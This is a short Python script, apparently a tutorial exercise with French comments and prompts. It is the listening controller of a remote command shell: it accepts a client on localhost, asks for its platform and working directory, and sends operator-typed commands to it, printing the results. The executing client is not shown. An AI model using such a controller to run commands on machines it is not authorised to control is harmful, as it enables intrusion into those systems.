import socket
import platform
import os

print("Platform:", platform.platform())
print("OS:", os.name)

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

def socket_receive_all_data(socket_p, data_len):
    current_data_len = 0
    total_data = None
    print("socket_receive_all: data_len =", data_len)
    while current_data_len < data_len:
        chunk_len = data_len - current_data_len
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        data = socket_p.recv(chunk_len)
        print(" len:", len(data))
        if not data:
            return None
        if not total_data:
            total_data = data
        else:
            total_data += data
        current_data_len += len(data)
        print(" total_data_len:", current_data_len, " / ", data_len)
    return total_data

def socket_send_command_and_receive_all_data(socket_p, command):
    if not command:
        return None
    socket_p.sendall(command.encode())

    header_data = socket_receive_all_data(socket_p, 13)
    if not header_data:
        return None
    longueur_data = int(header_data.decode())
    print("longueur_data =", longueur_data)

    data_recues = socket_receive_all_data(socket_p, longueur_data)
    if not data_recues:
        return None
    return data_recues.decode()

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST_IP, HOST_PORT))
s.listen()

print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
connection_socket, client_address = s.accept()
print(f"Connexion établie avec {client_address}")

while True:
    infos_data = socket_send_command_and_receive_all_data(connection_socket, "infos")
    if not infos_data:
        break

    infos_split = infos_data.strip().split("|")
    plateforme = infos_split[0]
    cwd = infos_split[1] if len(infos_split) > 1 else ""

    print(f"Platforme: {plateforme}")
    print(f"Repertoire courant: {cwd}")

    commande = input(client_address[0] + ":" + str(client_address[1]) + " " + cwd + " > ")

    if commande == "":
        continue

    data_recues = socket_send_command_and_receive_all_data(connection_socket, commande)
    if not data_recues:
        break
    print(data_recues)

s.close()
connection_socket.close()